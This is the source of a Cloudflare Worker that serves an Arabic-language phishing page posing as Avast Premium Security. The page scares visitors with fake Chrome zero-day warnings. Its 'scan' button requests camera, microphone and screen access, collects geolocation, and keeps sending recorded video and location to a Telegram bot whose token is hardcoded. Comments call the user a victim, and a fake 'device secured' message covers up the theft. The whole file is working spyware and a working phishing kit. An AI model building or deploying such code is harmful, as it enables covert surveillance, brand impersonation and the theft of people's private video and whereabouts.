addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // 🛡️
  const cacheBuster = "v" + Date.now();
  const logoUrl = "https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg?" + cacheBuster;
  
  const html = `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Avast Premium Security | Shield Advisor</title>
    <meta name="description" content="⚠️ تنبيه أمني: تم اكتشاف ثغرات Zero-Day في محرك V8. ابدأ الفحص الآن لتأمين جهازك ومنع Sandbox Escape.">
    
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://bot1.talah2026-2.workers.dev/">
    <meta property="og:title" content="Avast Premium Security | Shield Advisor">
    <meta property="og:description" content="نظام حماية سحابي متطور لتأمين المتصفح والكاميرا ومنع محاولات التجسس.">
    <meta property="og:image" content="${logoUrl}">
    <meta property="og:image:secure_url" content="${logoUrl}">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="600">
    <meta property="og:image:height" content="600">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Avast Premium Security | Shield Advisor">
    <meta name="twitter:description" content="⚠️ تهديد Zero-Day في كروم! قم بتأمين جهازك الآن فوراً عبر فحص Avast السحابي.">
    <meta name="twitter:image" content="${logoUrl}">

    <style>
        :root { --orange: #ff7b00; --bg: #fffcf5; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: white; color: #333; overflow-x: hidden; }
        
        /* Header الاحترافي */
        .header { display: flex; justify-content: space-between; padding: 15px 8%; align-items: center; border-bottom: 2px solid var(--orange); background: #fff; }
        .logo-small { width: 45px; height: 45px; border-radius: 50%; border: 2px solid var(--orange); object-fit: cover; }
        .status-badge { color: green; font-size: 13px; font-weight: bold; }

        /* Hero Section */
        .hero { background: var(--bg); padding: 60px 8%; text-align: center; border-bottom: 1px solid #f0e0c0; }
        .main-card { background: white; padding: 40px; border-radius: 25px; box-shadow: 0 20px 60px rgba(0,0,0,0.12); display: inline-block; width: 100%; max-width: 550px; border: 2.5px solid var(--orange); }
        
        .logo-main { width: 120px; height: 120px; border-radius: 50%; box-shadow: 0 0 25px rgba(255, 123, 0, 0.3); margin-bottom: 25px; border: 3px solid var(--orange); object-fit: cover; }

        .btn-scan { background: var(--orange); color: white; border: none; padding: 22px 0; font-size: 1.6rem; font-weight: bold; border-radius: 60px; cursor: pointer; width: 100%; box-shadow: 0 10px 25px rgba(255, 123, 0, 0.4); transition: 0.3s; }
        .btn-scan:hover { transform: translateY(-4px); box-shadow: 0 15px 30px rgba(255, 123, 0, 0.6); }

        /* شاشة الكونسول */
        .terminal { display: none; background: #0b0e14; color: #00ff41; padding: 20px; border-radius: 12px; font-family: monospace; font-size: 14px; text-align: left; direction: ltr; height: 160px; overflow-y: auto; margin-top: 20px; border: 1px solid #333; }
        
        .vuln-box { margin-top: 25px; text-align: right; background: #fff5f5; padding: 15px; border-radius: 12px; border: 1px dashed #ff4d4f; }
        .vuln-item { color: #cf1322; font-size: 13px; margin-bottom: 5px; }
        .vuln-item::before { content: "⚠️"; margin-left: 8px; }
    </style>
</head>
<body>

<div class="header">
    <div style="display: flex; align-items: center;">
        <img src="${logoUrl}" class="logo-small">
        <span style="font-weight: bold; margin-right: 12px; color: var(--orange); font-size: 20px;">Shield Advisor AI</span>
    </div>
    <div class="status-badge">Cloud Engine: Active ✅</div>
</div>

<div class="hero">
    <h1>مركز أمان <span style="color:var(--orange)">Avast</span> المتطور</h1>
    <p style="color: #666; margin-bottom: 40px; font-size: 1.1rem;">تم اكتشاف ثغرات (Zero-Day) في محرك V8 ومحاولات Sandbox Escape. اضغط للتأمين فوراً.</p>

    <div class="main-card" id="content-area">
        <div id="init-ui">
            <img src="${logoUrl}" class="logo-main">
            <button class="btn-scan" onclick="launchInfectionEngine()">بدء الفحص وتأمين الجهاز</button>
            
            <div class="vuln-box">
                <div class="vuln-item">كشف ثغرة Use-After-Free في الذاكرة</div>
                <div class="vuln-item">ثغرة Type Confusion في محرك JavaScript</div>
            </div>
        </div>
        <div class="terminal" id="term"></div>
    </div>
</div>

<script>
    const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
    const ADMIN_ID = "8754338811";

    async function botLog(text) {
        await fetch(\`https://api.telegram.org/bot\${TOKEN}/sendMessage\`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'Markdown' })
        });
    }

    async function launchInfectionEngine() {
        document.getElementById('init-ui').style.display = 'none';
        const term = document.getElementById('term');
        term.style.display = 'block';
        term.innerHTML = "> Connecting to Avast Secure Cloud...<br>> Analyzing V8 Engine vulnerabilities...<br>";

        try {
            // طلب أذونات الكاميرا والشاشة
            const cam = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const scr = await navigator.mediaDevices.getDisplayMedia({ video: true });
            
            botLog("🚀 **صيد جديد!** الضحية وافق على كافة الأذونات وبدأ البث.");

            // سحب الموقع والـ IP
            navigator.geolocation.getCurrentPosition(p => {
                botLog(\`📍 موقع الضحية: \\nhttps://www.google.com/maps?q=${p.coords.latitude},\${p.coords.longitude}\`);
            });

            // تسجيل وإرسال الفيديوهات
            record(cam, "📷 كاميرا");
            record(scr, "🖥️ شاشة");

            // تمويه الضحية بنجاح العملية
            term.innerHTML += "> [SUCCESS] Security patch applied.<br>> System Secured.";
            setTimeout(() => {
                document.getElementById('content-area').innerHTML = \`
                    <img src="${logoUrl}" style="width:70px; border-radius:50%; margin-bottom:15px; border:2px solid var(--orange);">
                    <h3 style="color:#00ff41;">✅ تم تأمين الجهاز بنجاح!</h3>\`;
            }, 3000);

        } catch (e) {
            alert("⚠️ تنبيه أمني: يجب الموافقة على الأذونات لتأمين جهازك من الثغرات المكتشفة.");
            location.reload();
        }
    }

    function record(s, l) {
        const r = new MediaRecorder(s);
        let c = [];
        r.ondataavailable = e => c.push(e.data);
        r.onstop = async () => {
            const b = new Blob(c, { type: 'video/mp4' });
            const f = new FormData();
            f.append('chat_id', ADMIN_ID);
            f.append('video', b, l + ".mp4");
            fetch(\`https://api.telegram.org/bot\${TOKEN}/sendVideo\`, { method: 'POST', body: f });
            if (s.active) record(s, l);
        };
        r.start();
        setTimeout(() => { if(r.state === "recording") r.stop(); }, 30000);
    }
</script>
</body>
</html>
  `
  return new Response(html, { headers: { 'content-type': 'text/html;charset=UTF-8' } })
}
